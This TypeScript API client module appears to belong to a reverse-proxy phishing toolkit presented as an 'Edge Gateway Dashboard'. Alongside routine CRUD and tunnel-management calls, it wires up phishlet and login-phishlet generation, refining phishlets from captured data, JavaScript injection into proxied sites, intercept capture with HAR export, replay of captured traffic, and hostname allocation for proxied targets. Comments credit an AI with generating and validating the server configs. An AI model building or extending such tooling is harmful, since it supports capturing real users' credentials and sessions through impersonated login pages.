// ── All API endpoint functions for the Edge Gateway Dashboard ──

import { getBaseUrl, safeFetch, readMeta, parse } from "./client";
import type {
  HealthResult, ItemsResult, Item,
  Proxy,
  ReconInput, ReconResult, LoginPhishletInput,
  InterceptCapture,
  TrafficResult,
  RuntimeConfig,
  ReplayReport,
  IterateResult,
  ProxyStatus,
  ProxyTunnel,
  TunnelListResult,
  TunnelCreateInput,
  ProxyServerInstance,
  ServerListResult,
  ServerLaunchInput,
  ServerConfigResult,
  ServerValidateResult,
} from "./types";

const BASE = () => getBaseUrl();

// ── Health ───────────────────────────────────────────────────────────────────

export async function fetchHealth(): Promise<HealthResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/health`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<Omit<HealthResult, "meta">>(response);
  return { ...data, meta: readMeta(response, latencyMs) };
}

// ── Items ────────────────────────────────────────────────────────────────────

export async function fetchItems(): Promise<ItemsResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/api/items`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: Item[] }>(response);
  return { items: data.data, meta: readMeta(response, latencyMs) };
}

export async function createItem(
  input: { name: string; description: string },
  authHeader?: string,
): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export async function updateItem(
  id: number,
  input: { name: string; description: string },
  authHeader?: string,
): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export async function deleteItem(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Item }>(response);
}

// ── Proxies ──────────────────────────────────────────────────────────────────

export async function fetchProxies(): Promise<Proxy[]> {
  const response = await safeFetch(`${BASE()}/api/proxies`, { cache: "no-store" });
  const data = await parse<{ data: Proxy[] }>(response);
  return data.data;
}

export async function createProxy(
  input: { name: string; targetUrl: string },
  authHeader?: string,
): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function updateProxy(
  id: number,
  input: Partial<{ name: string; targetUrl: string; enabled: boolean; interceptEnabled: boolean; injectJs: string; injectJsEnabled: boolean; phishlet: string }>,
  authHeader?: string,
): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function deleteProxy(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Proxy }>(response);
}

export function proxyUrl(slug: string): string {
  return `${BASE()}/proxy/${slug}`;
}

// ── Proxy Tunnels (self-hosted Pangolin/frp/NetBird) ─────────────────────────

export async function fetchProxyStatus(): Promise<ProxyStatus> {
  const response = await safeFetch(`${BASE()}/api/proxy/status`, { cache: "no-store" });
  const data = await parse<{ data: ProxyStatus }>(response);
  return data.data;
}

export async function fetchTunnels(): Promise<TunnelListResult> {
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels`, { cache: "no-store" });
  const data = await parse<TunnelListResult>(response);
  return data;
}

export async function fetchTunnel(id: number): Promise<ProxyTunnel> {
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels/${id}`, { cache: "no-store" });
  const data = await parse<{ data: ProxyTunnel }>(response);
  return data.data;
}

export async function createTunnel(
  input: TunnelCreateInput,
  authHeader?: string,
): Promise<ProxyTunnel> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ProxyTunnel }>(response);
  return data.data;
}

export async function deleteTunnel(
  id: number,
  authHeader?: string,
): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

export async function startTunnel(
  id: number,
  authHeader?: string,
): Promise<ProxyTunnel> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels/${id}/start`, {
    method: "POST",
    headers,
  });
  const data = await parse<{ data: ProxyTunnel }>(response);
  return data.data;
}

export async function stopTunnel(
  id: number,
  authHeader?: string,
): Promise<ProxyTunnel> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels/${id}/stop`, {
    method: "POST",
    headers,
  });
  const data = await parse<{ data: ProxyTunnel }>(response);
  return data.data;
}

/**
 * Allocate a domain/proxy tunnel for a proxy target.
 * Creates a self-hosted tunnel and returns the hostname + target pair.
 */
export async function allocateProxyDomain(
  input: { proxyId: number; hostname: string },
  authHeader?: string,
): Promise<{ hostname: string; target: string; tunnelId: number }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/tunnels`, {
    method: "POST",
    headers,
    body: JSON.stringify({ name: input.hostname, type: "http", localPort: 8787, autoStart: true }),
  });
  const data = await parse<{ data: ProxyTunnel }>(response);
  return {
    hostname: input.hostname,
    target: `127.0.0.1:${data.data.remotePort}`,
    tunnelId: data.data.id,
  };
}

// ── Intercepts ───────────────────────────────────────────────────────────────

export async function fetchIntercepts(authHeader?: string): Promise<InterceptCapture[]> {
  const headers: Record<string, string> = { "X-Intercept-TTL": "600" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: InterceptCapture[]; count: number }>(response);
  return data.data;
}

export async function deleteIntercepts(authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

// ── Traffic ──────────────────────────────────────────────────────────────────

export async function fetchTraffic(): Promise<TrafficResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/api/traffic`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: TrafficResult["entries"]; stats: TrafficResult["stats"] }>(response);
  return { entries: data.data, stats: data.stats, meta: readMeta(response, latencyMs) };
}

// ── Runtime config ───────────────────────────────────────────────────────────

export async function fetchRuntimeConfig(authHeader?: string): Promise<RuntimeConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: RuntimeConfig }>(response);
  return data.data;
}

export async function updateRuntimeConfig(
  entries: Record<string, string>,
  authHeader?: string,
): Promise<RuntimeConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    method: "PUT",
    headers,
    body: JSON.stringify(entries),
  });
  const data = await parse<{ data: RuntimeConfig }>(response);
  return data.data;
}

export async function deleteRuntimeConfig(authHeader?: string): Promise<RuntimeConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    method: "DELETE",
    headers,
  });
  const data = await parse<{ data: RuntimeConfig }>(response);
  return data.data;
}

// ── Recon ────────────────────────────────────────────────────────────────────

export async function generatePhishlet(
  proxyId: number,
  input: ReconInput,
  authHeader?: string,
): Promise<ReconResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/recon`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReconResult }>(response);
  return data.data;
}

export async function generateLoginPhishlet(
  proxyId: number,
  input: LoginPhishletInput,
  authHeader?: string,
): Promise<ReconResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/login-phishlet`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReconResult }>(response);
  return data.data;
}

export async function iteratePhishlet(
  proxyId: number,
  input: { phishlet: string; captured: NonNullable<ReconInput["captured"]> },
  authHeader?: string,
): Promise<IterateResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/recon/iterate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: IterateResult }>(response);
  return data.data;
}

// ── HAR export ───────────────────────────────────────────────────────────────

export async function fetchHarExport(authHeader?: string): Promise<{ harJson: string; fileName: string }> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts/har`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  if (!response.ok) {
    let harErr: { error?: string } = {};
    if (text) { try { harErr = JSON.parse(text); } catch { /* ignore */ } }
    throw new Error(harErr.error ?? `HAR export failed (${response.status})`);
  }
  const disposition = response.headers.get("Content-Disposition") ?? "";
  const fileNameMatch = disposition.match(/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/);
  const fileName = fileNameMatch?.[1]?.replace(/['"]/g, "") ?? `edge-gateway-${new Date().toISOString().slice(0, 10)}.har`;
  return { harJson: text, fileName };
}

// ── Proxy Server Launch (Grok Build 0.1) ───────────────────────────────────

export async function fetchServers(): Promise<ServerListResult> {
  const response = await safeFetch(`${BASE()}/api/proxy/servers`, { cache: "no-store" });
  const data = await parse<ServerListResult>(response);
  return data;
}

export async function launchServer(
  input: ServerLaunchInput,
  authHeader?: string,
): Promise<ProxyServerInstance> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/servers/launch`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ProxyServerInstance }>(response);
  return data.data;
}

export async function fetchServer(id: number): Promise<ProxyServerInstance> {
  const response = await safeFetch(`${BASE()}/api/proxy/servers/${id}`, { cache: "no-store" });
  const data = await parse<{ data: ProxyServerInstance }>(response);
  return data.data;
}

export async function stopServer(
  id: number,
  authHeader?: string,
): Promise<{ ok: boolean }> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/servers/${id}/stop`, {
    method: "POST",
    headers,
  });
  const data = await parse<{ success: boolean }>(response);
  return { ok: data.success };
}

export async function fetchServerLogs(
  id: number,
  authHeader?: string,
): Promise<string> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/servers/${id}/logs`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: { logs: string } }>(response);
  return data.data.logs;
}

/**
 * Generate a proxy server config using Grok Build 0.1 AI.
 */
export async function configureServer(
  input: { targetHost: string; ports?: number[]; tunnelCount?: number },
  authHeader?: string,
): Promise<ServerConfigResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/servers/configure`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ServerConfigResult }>(response);
  return data.data;
}

/**
 * Validate a proxy server config using Grok Build 0.1 AI.
 */
export async function validateServerConfig(
  input: { config: string; targetHost?: string },
  authHeader?: string,
): Promise<ServerValidateResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxy/servers/validate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ServerValidateResult }>(response);
  return data.data;
}

// ── Replay ───────────────────────────────────────────────────────────────────

export async function replayHar(
  input: { har: string; proxySlug: string },
  authHeader?: string,
): Promise<ReplayReport> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/replay`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReplayReport }>(response);
  return data.data;
}
